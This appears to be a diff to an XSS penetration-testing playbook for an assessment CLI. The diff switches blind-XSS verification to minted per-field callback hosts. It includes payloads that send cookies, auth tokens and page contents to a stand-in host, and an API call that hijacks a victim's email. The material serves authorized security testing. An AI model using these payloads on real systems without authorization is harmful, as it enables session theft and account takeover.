@@ -21,7 +21,7 @@ Most XSS findings in 2025 are in client-side rendering contexts (React `dangerou
 - `aith assess kali exec -- dalfox ...` (automated reflected XSS scanner — all target-facing tool invocations must go through the kali exec wrapper; use `--technique XSS --probe-kind payload --phase consume-test --timeout 300`)
 - `aith assess kali exec -- curl ...` (manual request crafting and response analysis — use `--technique XSS --probe-kind payload --phase consume-test --timeout 30`)
 - Browser DevTools — DOM inspection, source-to-sink tracing, event listener enumeration (client-side analysis only)
-- OOB callback client — blind XSS verification: check readiness with `aith oob status --json`; start a named client with `aith oob client start <name> --engagement <key> --agent <agent>`; read correlated hits with `aith oob client logs <name> --lines 80`
+- `aith oob mint` / `aith oob poll` — blind XSS verification: mint a nonce-tagged callback host per injection point, embed it in the payload, then `poll` to see which planted payload fired and where (replaces eyeballing the raw listener log). Check readiness with `aith oob status --json`; if no named client is running, start one with `aith oob client start <name> --engagement <key> --agent <agent>`.
 
 ---
 
@@ -47,7 +47,7 @@ Target has query parameters reflecting in HTML?
 
 ## Automated Scanning with dalfox
 
-Run dalfox through the kali exec wrapper so every scan lands in the audit pipeline. Use the unique OOB client URL from `aith oob client start <name>` / `aith oob client logs <name>` for blind XSS callbacks.
+Run dalfox through the kali exec wrapper so every scan lands in the audit pipeline. For blind XSS callbacks, mint the callback host first (`aith oob mint --technique blind-xss --target-url <url> --probe-kind dalfox-blind`) and pass its `http` URL to `--blind`; after the scan, `aith oob poll --client <name>` tells you whether dalfox's blind payload ever rendered.
 
 ```bash
 # Single URL with parameter
@@ -63,11 +63,15 @@ aith assess kali exec \
   --probe-kind payload --phase consume-test --timeout 900 \
   -- sh -c 'cat /engagements/$ENGAGEMENT_KEY/scans/urls_with_params.txt | dalfox pipe --silence'
 
-# With blind XSS callback (use the unique URL from `aith oob client logs <name>`)
+# With blind XSS callback — mint the host, capture its http URL, pass to --blind
+OOB_CALLBACK_URL=$(aith oob mint --technique blind-xss \
+  --target-url "https://TARGET/search?q=test" --probe-kind dalfox-blind --json \
+  | python3 -c 'import json,sys; print(json.load(sys.stdin)["urls"]["http"])')
 aith assess kali exec \
   --technique XSS --intent "dalfox blind XSS scan with OOB callback" \
   --probe-kind payload --phase consume-test --timeout 300 \
   -- dalfox url "https://TARGET/search?q=test" --blind "$OOB_CALLBACK_URL"
+# Later: aith oob poll --client <name>  → a matched row means the payload fired
 
 # JSON output for triage
 aith assess kali exec \
@@ -257,21 +261,30 @@ Inject blind XSS payloads into every field that might be rendered in an internal
 
 ### Payload Construction
 
-Use an OOB callback to detect when and where the payload fires:
+Use an OOB callback to detect when and where the payload fires. **Mint a fresh nonce host per injection point** so `poll` can tell you exactly which field rendered — encode the field name in `--param` and the callback host's nonce becomes the per-field canary:
+
+```bash
+# Mint one callback per planted field; the printed host carries a unique nonce
+aith oob mint --technique blind-xss --target-url "https://target/support/ticket" \
+  --param ticket_subject --probe-kind stored-blind
+# → http  http://<nonce>.researcher.example/
+```
+
+Substitute that host (shown below as `<nonce>.researcher.example`) into each payload:
 
 ```html
 <!-- Basic blind XSS with callback -->
-"><script src=https://YOUR_OOB_CALLBACK/probe></script>
+"><script src=https://<nonce>.researcher.example/probe></script>
 
 <!-- If script tags are filtered, use event handlers -->
-"><img src=x onerror=fetch('https://YOUR_OOB_CALLBACK/probe?c='+document.cookie)>
+"><img src=x onerror=fetch('https://<nonce>.researcher.example/probe?c='+document.cookie)>
 
 <!-- Polyglot for unknown context -->
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik2telerik3telerik4telerik5telerik6//oNcliCk=alert()//><svg onload=fetch('https://YOUR_OOB_CALLBACK/x')//
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik2telerik3telerik4telerik5telerik6//oNcliCk=alert()//><svg onload=fetch('https://<nonce>.researcher.example/x')//
 
 <!-- Data exfiltration payload (fires silently in admin context) -->
 "><script>
-fetch('https://YOUR_OOB_CALLBACK/hit', {
+fetch('https://<nonce>.researcher.example/hit', {
   method: 'POST',
   body: JSON.stringify({
     url: location.href,
@@ -285,8 +298,8 @@ fetch('https://YOUR_OOB_CALLBACK/hit', {
 
 ### Operational Notes
 
-- **Timing**: Some blind XSS triggers days or weeks after injection. A support ticket might sit in a queue for a week before an admin opens it. Log viewers might only be checked during incident response. Set callbacks and be patient.
-- **Callback verification**: After injecting, check shared readiness with `aith oob status --json`, then check the named client periodically with `aith oob client logs <name> --lines 80`. Use `aith logs oob --lines 80` only when debugging raw server/FRP health. A correlated client hit proves the payload rendered in an internal context.
+- **Timing**: Some blind XSS triggers days or weeks after injection. A support ticket might sit in a queue for a week before an admin opens it. Log viewers might only be checked during incident response. Mint the callbacks, then poll periodically and be patient.
+- **Callback verification**: After injecting, confirm shared readiness with `aith oob status --json`, then poll periodically with `aith oob poll --client <name>`. Each matched row carries the `--param`/`--target-url` you minted with, so the hit names the field that rendered and the page it rendered on — no manual log correlation. (`aith logs oob --lines 80` is only for debugging raw server/FRP health.) A matched callback proves the payload executed in an internal context.
 - **Impact escalation**: A blind XSS in an admin panel is not just "XSS." If the admin panel has: user management (account takeover), payment processing (financial impact), server configuration (RCE chain), or API key management (full compromise) — the XSS inherits that blast radius.
 - **Evidence capture**: The callback payload should exfil enough context to prove impact: the URL where it fired (shows it was admin panel), cookies/tokens (shows session hijack is possible), and a DOM snapshot (shows what the admin sees).
 
@@ -396,24 +409,24 @@ Stored XSS requires a two-phase test: inject, then find every location where the
 
 `alert(1)` proves execution. Engagement reports need impact — you must show the attacker outcome, not just code execution.
 
-Use the unique callback URL from `aith oob client start <name>` / `aith oob client logs <name>` for data exfiltration; check hits with `aith oob client logs <name> --lines 80`.
+Mint a callback host for the exfil payload (`aith oob mint --technique blind-xss --probe-kind exfil`), substitute its nonce host below, and confirm the steal landed with `aith oob poll --client <name>`.
 
 ```javascript
 // Prove execution context
 alert(document.domain)
 
-// Session hijack — cookie theft (use unique OOB URL from aith oob client logs <name>)
-fetch('https://OOB_CALLBACK/steal?c='+document.cookie)
-new Image().src='https://OOB_CALLBACK/steal?c='+document.cookie
+// Session hijack — cookie theft (substitute the minted <nonce>.researcher.example host)
+fetch('https://<nonce>.researcher.example/steal?c='+document.cookie)
+new Image().src='https://<nonce>.researcher.example/steal?c='+document.cookie
 
 // Token theft from localStorage/sessionStorage
-fetch('https://OOB_CALLBACK/steal?t='+localStorage.getItem('auth_token'))
+fetch('https://<nonce>.researcher.example/steal?t='+localStorage.getItem('auth_token'))
 
 // Account takeover — change email/password via authenticated API call
 fetch('/api/user/email', {method:'PUT', headers:{'Content-Type':'application/json'}, body:'{"email":"attacker@evil.example"}'})
 
 // DOM data exfiltration — steal what the victim sees
-fetch('https://OOB_CALLBACK/dom', {method:'POST', body:document.body.innerHTML.substring(0,5000)})
+fetch('https://<nonce>.researcher.example/dom', {method:'POST', body:document.body.innerHTML.substring(0,5000)})
 ```
 
 **Severity calibration**: XSS alone is typically MEDIUM. XSS + session hijack = HIGH. XSS + account takeover chain = HIGH/CRITICAL. Blind XSS in admin panel + admin session hijack + admin action (user management, config change) = CRITICAL.
